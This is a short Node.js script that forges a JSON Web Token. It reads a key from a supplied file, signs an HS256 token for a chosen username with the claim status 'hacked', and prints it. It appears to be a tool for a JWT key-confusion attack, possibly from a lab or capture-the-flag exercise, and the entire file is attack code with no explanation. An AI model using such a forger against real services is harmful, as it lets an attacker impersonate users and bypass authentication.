const jwt = require("jsonwebtoken");
const fs = require("fs");
const colors = require("colors/safe");
if (process.argv.length < 5) {
  console.error("You need to provide --file <filepath> and --username <username> argument")
} else {
  let key = fs.readFileSync(process.argv[3], "utf8");
  let token = jwt.sign({ username: process.argv[5], status: "hacked" }, key, {
  algorithm: "HS256"
  });
  console.log("\n")
  console.log(colors.green("This is your token: " + token));
}